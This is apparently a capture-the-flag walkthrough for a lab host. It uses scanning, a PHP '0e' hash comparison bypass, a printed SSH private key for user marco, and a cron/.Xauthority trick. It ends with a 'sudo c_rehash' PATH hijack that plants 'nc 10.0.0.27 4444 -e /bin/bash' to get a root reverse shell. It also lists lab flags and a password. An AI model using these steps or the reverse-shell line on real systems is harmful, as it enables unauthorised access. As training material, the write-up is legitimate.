Target: 10.0.0.12

    # nmap -sS -T4 -p- 10.0.0.12

    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    3389/tcp open  ms-wbt-server

Port 3389 is running Windows Remote Desktop.

## ***HTTP***

Going to ***http://10.0.0.12***, we can find a comment.

![image](https://user-images.githubusercontent.com/76552238/167902811-b073e2c8-2154-4179-8514-87afb974b0e3.png)

<!--Marco, remember to delete the .bak file-->

Let's brute force the directories and search for ***bak*** files.

    # gobuster dir -u http://10.0.0.12/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x bak

    /check.bak            (Status: 200) [Size: 273]

After downloading the file to our local machine we can read it.

### ***check.bak***

    <?php
    // Login part.
    $pass = $_POST['password'];
    //marco please dont use md5, is not secure.
    //$passwordhashed = hash('md5', $pass);
    $passwordhashed = hash('sha256',$pass);
    if ($passwordhashed == '0e0001337') {
    //Your code here
    }
    else{
    //Another code here
    }
    //To finish
    ?>

34250003024812 == 0   
true

### ***key.txt:***

    -----BEGIN OPENSSH PRIVATE KEY-----
    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
    NhAAAAAwEAAQAAAQEAxiKdFmWJiVfVYaNGov1xuh0/nrXnNsx2s6g5IoIJrmkX+9qzt2US
    ZWMgrjLzAyB3wrLFysCPh4F8GU87pJkbpc0prM/8vB2WJCg5ktDQ6o0vwH219sPKUS4e9R
    s2bPz7CJX5bzFDQ3B6ZUOs1itZ1t/uq38XuCxDjI8XxU6fusB3Rjz2XIombtFwo78W1pkX
    VnQhzZOQ+b8UaC5lZeKatcZ0xdc0iQgiAbcRN7sXYCDMxMmo9KsxqzWjd56hLrv1nsTy2t
    VBXzDRw+5JU4AJlGDRB/Upq/oKbGDCOmgNUsJPQKW4TgEAWhUa+t/ue2Bs/wFjCY7w/LkY
    pK4bnY5eHQAAA8C/pv23v6b9twAAAAdzc2gtcnNhAAABAQDGIp0WZYmJV9Vho0ai/XG6HT
    +etec2zHazqDkiggmuaRf72rO3ZRJlYyCuMvMDIHfCssXKwI+HgXwZTzukmRulzSmsz/y8
    HZYkKDmS0NDqjS/AfbX2w8pRLh71GzZs/PsIlflvMUNDcHplQ6zWK1nW3+6rfxe4LEOMjx
    fFTp+6wHdGPPZciiZu0XCjvxbWmRdWdCHNk5D5vxRoLmVl4pq1xnTF1zSJCCIBtxE3uxdg
    IMzEyaj0qzGrNaN3nqEuu/WexPLa1UFfMNHD7klTgAmUYNEH9Smr+gpsYMI6aA1Swk9Apb
    hOAQBaFRr63+57YGz/AWMJjvD8uRikrhudjl4dAAAAAwEAAQAAAQEAlMcLA/VMmGfu33kW
    Im+DRUiPLCLVMo3HmFH6TRIuKNvbWY+4oT5w2NbdhFDXr4Jiyz0oTn3XiN3PDMY1N/yMCS
    0MXSp0UeE5i3709Gx+Y5GOyNDcoSYVtm2Wa2B6ts4jxievfDIWmv5LudxeXReCR1oxQm+V
    pQL/2fzc0ZifUj+/VSSIltgDKHxEfebfK0xShgXTSlUhickSapre2ArSdplM/rYvZLDWmd
    iGkGD3VnAgRtloy5v32vPI3M++OCrHbLxgff4odAjawejPPHVj3beMgCrqwb/CCNKEyWKc
    Jkjjt7nY/GUW4RfzM34LplezpmvrsLkTVMAb3KflDkDPFQAAAIBrP6Pnz0t8d/M+4hEb66
    IkrftwqMC+c8Z0HMGURTMco7jXfoXaVP3eWCafEZ/RobZm0Ob1mnBZ574Qn8ai5VLPyJz6
    5Ibe1Z6LWu6yCL/VFNyksnVARIuVjQt9pXpzbXOfn0H4ZHRBFyRhNHGjnft1PA59O30Dpw
    UVz9eO3K2EqQAAAIEA4baQFa4RYnZ/YK4F6acjsAPhk88poLjDT86eCQ08wO5+d8BGuSHE
    +BAqCZJuJTvvozYpZ5NFW4OEG9+T/HX2tvB6Ucc1pbQNNnB7CBp/VoLLTW+nuU3YJbgYlx
    VnWRRudD6K7wjZEHJ44XzLdTy2wyeUvZw/iJRZmqQ5hxXCD1MAAACBAOC4ucZotWaq/pb5
    V5RqLV8HU+DWFHAIfvqtYI5wCcZmAjGtXgLF1HY9MZ3bRPz2/m7cB44cdgCRbtmqBvnOvn
    6h9AS4gr1HOJEpjgohkxBTc2Mf/dpCCdcNCX2Xy5ExPSilbS2rUHHCIU2J/yZGTths8fBR
    cEjmSYvt0qFY/t7PAAAACm1hcmNvQGhhc2g=
    -----END OPENSSH PRIVATE KEY-----

>

    # ssh-keygen -l -f key.txt
    2048 SHA256:eSWsSZk1VWubUBDB9qNe7CkZXUMD453BCYkBiIglxpA marco@hash (RSA)

>

    # ssh marco@10.0.0.12 -i key.txt

## ***PRIVILEGE ESCALATION***

    $ cat user.txt 
    hashmanready

password for marco = marcothehasher

The file ***/home/maria/myterm.sh*** is part of the cron jobs.

We can login to port 3389 that is running ***Windows Remote Desktop*** through our Windows local machine.

After entering the password for the user ***marco*** we can copy the file ***.Xauthority*** from ***/home/marco*** to ***/home/maria***. Since the cron tab is running the script ***/home/maria/myterm.sh*** as the user maria, waiting a couple of seconds will grant us a shell as the user maria.

![image](https://user-images.githubusercontent.com/76552238/167955155-33721c1a-11ad-4241-b080-6b86de6a35d0.png)

Reading man page about the command ***c_rehash*** we find out it uses the command ***openssl***. We can create a fake executable named openssl and change the path variable and be able to gain a shell as the root user on the remote machine.  

    Remote Machine:

    $ mkdir /tmp/exploit
    $ echo 'nc 10.0.0.27 4444 -e /bin/bash' > openssl
    $ sudo c_rehash

>

    Local Machine:

    # nc -lnvp 4444
    listening on [any] 4444 ...
    connect to [10.0.0.27] from (UNKNOWN) [10.0.0.12] 52544
    whoami
    root
    #  cat root.txt 
    hashhater